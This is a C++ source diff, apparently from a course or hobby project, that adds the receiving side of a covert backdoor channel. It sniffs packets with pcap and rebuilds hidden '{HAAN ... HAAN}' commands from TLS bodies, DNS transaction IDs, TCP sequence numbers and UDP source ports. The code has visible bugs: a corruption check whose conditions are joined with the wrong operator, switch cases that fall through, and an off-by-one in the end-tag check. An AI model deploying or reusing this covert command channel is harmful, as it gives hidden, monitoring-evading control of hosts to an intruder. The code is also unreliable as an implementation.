@@ -7,15 +7,18 @@
 #include <cstdio>
 #include <zconf.h>
 #include <netinet/tcp.h>
+#include <netinet/udp.h>
 #include <netinet/ip.h>       // struct ip and IP_MAXPACKET (which is 65535)
 #include "NetworkMonitor.h"
 #include "../shared/Logger.h"
 #include "../shared/Authenticator.h"
 #include "../shared/PacketIdentifier.h"
 #include "../shared/HCrypto.h"
+#include "../shared/Structures.h"
 #include <sys/epoll.h>
 #include <pcap.h>
 #include <cstring>
+#include <algorithm>
 
 NetworkMonitor * NetworkMonitor::instance = nullptr;
 
@@ -35,6 +38,126 @@ NetworkMonitor* NetworkMonitor::getInstance(TrafficAnalyzer * trafficAnalyzer, H
     }
 
     return NetworkMonitor::instance;
+}
+
+bool NetworkMonitor::isFullCommand() {
+
+    Logger::debug("NetworkMonitor:isFullCommand - Validating Data Retreived So Far");
+    Logger::debug("NetworkMonitor:isFullCommand - Command Currently Is: >" + *this->command + "<");
+
+    //{HAAN 00000000 data HAAN}\0
+
+    //if the first 5 letters don't checkout we should assume data is corrupted and start over
+    if(this->command->length() >= 5){
+        if(this->command->at(0) != '{' && this->command->at(1) != 'H' && this->command->at(2) != 'A'
+                && this->command->at(3) != 'A' && this->command->at(4) != 'N'){
+            Logger::debug("NetworkMonitor:isFullCommand - First 5 Letters In Command Don't Match. Assuming Corrupt");
+            Logger::debug("NetworkMonitor:isFullCommand - Command Currently Is: >" + *this->command + "<");
+
+            this->command->clear(); //clear the string contents. resetting it
+
+            return false;
+        }
+    }
+
+    //the length should at minimum be 11 characters
+    if(this->command->length() < 11){
+        return false;
+    }
+
+    //check it starts with {HAAN
+    unsigned long length = this->command->length();
+    string start = this->command->substr(0,5);
+    string end = this->command->substr(length - 1 - 5, 5);
+
+    Logger::debug("NetworkMonitor:isFullCommand - Parsed TAGS. Start: >" + start + "< End: >" + end + "<");
+    if(start.compare("{HAAN")!=0){
+        return false;
+    }
+
+    //check it ends with HAAN}
+    if(end.compare("HAAN}")!= 0){
+        return false;
+    }
+
+    return true;
+}
+
+void NetworkMonitor::parseApplicationContent(PacketMeta * meta, char * applicationLayer) {
+
+    switch(meta->applicationType){
+        case ApplicationType::TLS:{
+
+            struct TLS_HEADER * tls = (struct TLS_HEADER *)applicationLayer;
+            char * payload = applicationLayer + sizeof(struct TLS_HEADER);
+            string strPayload(payload);
+
+            Logger::debug("NetworkMonitor:parseApplicationContent - Packet is TLS. Data Is In The Body");
+            Logger::debug("NetworkMonitor:parseApplicationContent - Body Content: >" + strPayload + "<");
+
+            NetworkMonitor::instance->command->append(strPayload);
+
+            break;
+        }
+        case ApplicationType::DNS:{
+
+            struct DNS_HEADER * dns = (struct DNS_HEADER *)applicationLayer;
+
+            char content[2];
+            memcpy(content, &dns->id, 2);
+            string strContent(content);
+
+            Logger::debug("NetworkMonitor:parseApplicationContent - Packet is DNS. Data Is In The Transaction ID");
+            Logger::debug("NetworkMonitor:parseApplicationContent - ID Content: >" + strContent + "<");
+
+            NetworkMonitor::instance->command->append(strContent);
+
+            break;
+        }
+        default:{
+            Logger::debug("NetworkMonitor:parseApplicationContent - FATAL ERROR. APPLICATION TYPE UNKNOW");
+        }
+    }
+
+}
+
+void NetworkMonitor::parseTransportContent(PacketMeta * meta) {
+
+
+    switch(meta->transportType){
+        case TransportType::TCP:{
+
+            char * transportLayer = PacketIdentifier::findTransportLayer(meta);
+            struct tcphdr * tcp = (struct tcphdr *)transportLayer;
+
+            char content[4];
+            memcpy(content, &tcp->seq, 4);
+
+            Logger::debug("NetworkMonitor:parseTransportContent - Packet is TCP. Data Is In The Sequence Number");
+            Logger::debug("NetworkMonitor:parseTransportContent - Sequence Content: >" + to_string(content[2]) + "< >" + to_string(content[3]) + "<");
+
+            this->command->append(to_string(content[2]));
+            this->command->append(to_string(content[3]));
+
+        }
+        case TransportType::UDP:{
+
+            char * transportLayer = PacketIdentifier::findTransportLayer(meta);
+            struct udphdr * udp = (struct udphdr *)transportLayer;
+
+            char content[2];
+            memcpy(content, &udp->uh_sport, 2);
+
+            Logger::debug("NetworkMonitor:parseTransportContent - Packet is UDP. Data Is In The Source Port");
+            Logger::debug("NetworkMonitor:parseTransportContent - Source Content: >" + to_string(content[1]) + "<");
+
+            this->command->append(to_string(content[1]));
+
+        }
+        default:{
+            Logger::debug("NetworkMonitor:parseTransportContent - FATAL ERROR. TRANSPORT TYPE UNKNOWN");
+        }
+    }
 }
 
 void NetworkMonitor::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet) {
@@ -66,11 +189,26 @@ void NetworkMonitor::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *p
     if(Authenticator::isAuthenticPacket(&meta)){
 
         //packet has been successfully authenticated. Now to parse out what we need of the message
+        //need to determine what type fo packet again based off meta to know what to grab from where
 
+        Logger::debug("NetworkMonitor:listenForTraffic - Packet Is Ours. Parsing Contents");
 
+        if(meta.applicationType != ApplicationType::UNKNOWN){
+            Logger::debug("NetworkMonitor:listenForTraffic - Packet Contains Our Data In The Application Layer");
+            NetworkMonitor::instance->parseApplicationContent(&meta, applicationLayer);
+        }else{
+            Logger::debug("NetworkMonitor:listenForTraffic - Packet Contains Our Data In The Transport Layer");
+            NetworkMonitor::instance->parseTransportContent(&meta);
+        }
+
+        //if we have received the full message then kill listening so that our hanging method will return
+        if(NetworkMonitor::instance->isFullCommand()){
+            NetworkMonitor::instance->killListening();
+        }
 
 
     }else{
+        Logger::debug("NetworkMonitor:listenForTraffic - Packet Is Not Ours. Add To Traffic Analyzer");
         //if it is not our packet give it to the TrafficAnalyzer
         NetworkMonitor::instance->trafficAnalyzer->addPacketMetaToHistory(meta);
 
